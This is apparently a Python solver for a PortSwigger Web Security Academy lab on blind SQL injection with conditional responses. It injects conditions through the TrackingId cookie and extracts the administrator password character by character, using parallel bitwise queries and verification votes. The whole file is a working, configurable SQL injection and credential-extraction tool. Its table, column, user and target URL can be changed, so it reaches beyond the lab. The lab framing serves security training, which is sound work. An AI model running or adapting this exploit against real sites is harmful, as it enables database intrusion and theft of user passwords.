#!/usr/bin/env python3
"""
PortSwigger Web Security Academy lab solver:
Blind SQL injection with conditional responses.

Oracle: "Welcome back" appears in the response body when the injected
condition evaluates to TRUE.

Payload:
  xyz' AND (SELECT ASCII(SUBSTRING((SELECT Password FROM Users
      WHERE Username = 'Administrator'), 1, 1)) > 109)-- 

Speed: characters are recovered via parallel bitwise queries
((ASCII(...) & bit) > 0) plus a verification pass.

AUTHORIZED TESTING / TRAINING LABS ONLY.
"""

import argparse
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

BITS = [1, 2, 4, 8, 16, 32, 64]


def parse_args():
    p = argparse.ArgumentParser(
        description="Blind SQLi (conditional responses) password extractor "
                    "(authorized use only)"
    )
    p.add_argument("url", help="Lab URL, e.g. https://YOUR-LAB-ID.web-security-academy.net/")
    p.add_argument("--session", required=True, help="session cookie value")
    p.add_argument("--tracking", default="xyz", help="base TrackingId value")
    p.add_argument("--table", default="Users")
    p.add_argument("--column", default="Password")
    p.add_argument("--user-col", default="Username")
    p.add_argument("--username", default="Administrator")
    p.add_argument("--marker", default="Welcome back", help="TRUE-response marker")
    p.add_argument("--workers", type=int, default=4, help="Parallel requests (default 4)")
    p.add_argument("--delay", type=float, default=0.05, help="Per-request per-worker delay")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--retries", type=int, default=3)
    p.add_argument("--max-length", type=int, default=64)
    p.add_argument("--debug", action="store_true", help="Verbose request logging")
    return p.parse_args()


class ConditionalOracle:
    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.cookies.set("session", args.session)
        adapter = requests.adapters.HTTPAdapter(pool_maxsize=args.workers + 2)
        self.session.mount("https://", adapter)
        self.session.mount("http://", adapter)
        self.pool = ThreadPoolExecutor(max_workers=args.workers)
        self.requests_sent = 0
        self.lock = threading.Lock()
        self.last_resp = None

    def subselect(self) -> str:
        a = self.args
        return f"SELECT {a.column} FROM {a.table} WHERE {a.user_col} = '{a.username}'"

    def ask(self, condition: str) -> bool:
        payload = f"{self.args.tracking}' AND ({condition})-- "
        resp = None
        for attempt in range(self.args.retries):
            try:
                resp = self.session.get(
                    self.args.url,
                    cookies={"TrackingId": payload},
                    timeout=self.args.timeout,
                )
                with self.lock:
                    self.requests_sent += 1
                if resp.status_code == 200:
                    break
                time.sleep(1.0 * (attempt + 1))
            except requests.RequestException:
                if attempt == self.args.retries - 1:
                    raise
                time.sleep(1.0 * (attempt + 1))
        if self.args.delay:
            time.sleep(self.args.delay)
        self.last_resp = resp
        result = self.args.marker in resp.text
        if self.args.debug:
            state = "TRUE" if result else "FALSE"
            print(
                f"[D] {state} status={resp.status_code} len={len(resp.text)} "
                f"cond={condition!r}"
            )
        return result

    def ask_majority(self, condition: str, votes: int = 3) -> bool:
        results = list(self.pool.map(lambda _: self.ask(condition), range(votes)))
        return sum(results) > votes // 2

    def healthy(self) -> bool:
        return self.ask("1=1") and not self.ask("1=2")

    def wait_until_healthy(self) -> bool:
        for _ in range(3):
            if self.healthy():
                return True
            print("[!] Canary check failed (session expired / throttling) - waiting 3s ...")
            time.sleep(3)
        return False

    def length(self) -> int:
        sub = self.subselect()
        for _ in range(self.args.retries):
            # smallest n for which LENGTH > n is false -> n is the length
            lo, hi = 0, self.args.max_length
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask(f"SELECT LENGTH(({sub})) > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            if lo == 0:
                return 0
            if self.ask_majority(f"SELECT LENGTH(({sub})) = {lo}"):
                return lo
            print("[!] Length verification inconsistent - redoing search ...")
        return lo

    def bit_condition(self, pos: int, bit: int) -> str:
        sub = self.subselect()
        return (
            f"SELECT (ASCII(SUBSTRING(({sub}), {pos}, 1)) & {bit}) > 0"
        )

    def char_condition(self, pos: int, op: str, code: int) -> str:
        sub = self.subselect()
        return f"SELECT ASCII(SUBSTRING(({sub}), {pos}, 1)) {op} {code}"

    def extract_parallel(self, positions) -> dict:
        codes = {pos: 0 for pos in positions}
        futures = {}
        for pos in positions:
            for bit in BITS:
                fut = self.pool.submit(self.ask, self.bit_condition(pos, bit))
                futures[fut] = (pos, bit)
        for fut in as_completed(futures):
            pos, bit = futures[fut]
            if fut.result():
                codes[pos] |= bit
        return codes

    def verify_positions(self, codes: dict) -> set:
        futures = {
            self.pool.submit(self.ask, self.char_condition(pos, "=", code)): pos
            for pos, code in codes.items()
        }
        return {futures[f] for f in as_completed(futures) if not f.result()}

    def char_at_sequential(self, pos: int) -> str:
        for _ in range(self.args.retries):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if self.ask(self.char_condition(pos, ">", mid)):
                    lo = mid + 1
                else:
                    hi = mid
            if self.ask(self.char_condition(pos, "=", lo)):
                return chr(lo)
            print(f"[!] Position {pos}: inconsistent, retrying sequentially ...")
            if not self.wait_until_healthy():
                break
        return "?"

    def fix_positions(self, codes: dict) -> None:
        bad = self.verify_positions(codes)
        for pos in sorted(bad):
            print(f"[!] Position {pos}: parallel result unverified - re-extracting ...")
            ch = self.char_at_sequential(pos)
            if ch != "?":
                codes[pos] = ord(ch)

    def extract_fixed(self, count: int) -> dict:
        codes = self.extract_parallel(range(1, count + 1))
        self.fix_positions(codes)
        return codes

    def verify_full(self, extracted: str) -> bool:
        # strict 4-of-5: a plain majority can false-pass on a noisy oracle
        cond = f"SELECT ({self.subselect()}) = '{extracted}'"
        results = list(self.pool.map(lambda _: self.ask(cond), range(5)))
        return sum(results) >= 4


def sanity_check(oracle: ConditionalOracle) -> None:
    print("[*] Sanity check: TRUE (1=1) / FALSE (1=2) ... ", end="", flush=True)
    if not oracle.healthy():
        resp = oracle.last_resp
        sys.exit(
            f"\nFAIL - oracle misbehaving (last status="
            f"{resp.status_code if resp is not None else '?'}). "
            "Check URL, --session, --tracking."
        )
    print("ok")


def main() -> None:
    args = parse_args()
    oracle = ConditionalOracle(args)
    print("=" * 60)
    print("Blind SQLi (conditional responses) - password extractor")
    print("=" * 60)
    print(f"[*] Target : {args.url}")
    print(f"[*] Extract: {args.username}.{args.column} FROM {args.table} "
          f"(workers: {args.workers})")
    start = time.time()

    sanity_check(oracle)

    try:
        print("[*] Finding password length ...")
        count = oracle.length()
        if count == 0:
            sys.exit("[-] Length 0: row/column not found or conditions always false")
        print(f"[+] Password length: {count}")

        print(f"[*] Extracting {count} chars via parallel bitwise queries ...")
        codes = oracle.extract_fixed(count)
        extracted = "".join(chr(codes[p]) for p in sorted(codes))
        print(f"[*] Progress: {extracted}")

        while count < args.max_length and oracle.ask_majority(
            f"SELECT LENGTH(({oracle.subselect()})) > {count}", 3
        ):
            count += 1
            print(f"[!] Password longer than expected - adding position {count}")
            new = oracle.extract_parallel([count])
            oracle.fix_positions(new)
            codes.update(new)
            extracted = "".join(chr(codes[p]) for p in sorted(codes))
            print(f"[*] Progress: {extracted}")

        print("[*] Final verification (5 votes) ...")
        verified = False
        for _ in range(3):
            if oracle.verify_full(extracted):
                verified = True
                break
            print("[!] Full-string verification FAILED - re-checking positions ...")
            fixed_any = False
            for pos in sorted(codes):
                if not oracle.ask_majority(oracle.char_condition(pos, "=", codes[pos])):
                    print(f"[!]   position {pos}: {chr(codes[pos])!r} is wrong")
                    ch = oracle.char_at_sequential(pos)
                    if ch != "?":
                        codes[pos] = ord(ch)
                        fixed_any = True
            if oracle.ask_majority(
                f"SELECT LENGTH(({oracle.subselect()})) > {len(extracted)}"
            ):
                print(f"[!]   password is longer than {len(extracted)} chars!")
            if not fixed_any:
                break
            extracted = "".join(chr(codes[p]) for p in sorted(codes))
            print(f"[*] Progress: {extracted}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
    finally:
        oracle.pool.shutdown(wait=False)

    elapsed = time.time() - start
    print("=" * 60)
    if verified:
        print(f"[+] Verified: string matches the stored value exactly")
    else:
        print("[!] UNVERIFIED: result may be wrong - do not rely on it")
    print(f"[+] Administrator password (repr): {extracted!r} ({len(extracted)} chars)")
    print(f"[+] Requests: {oracle.requests_sent} in {elapsed:.1f}s")
    print("=" * 60)
    print("Next: log in as Administrator with this password to solve the lab.")
    if not verified:
        sys.exit(1)


if __name__ == "__main__":
    main()
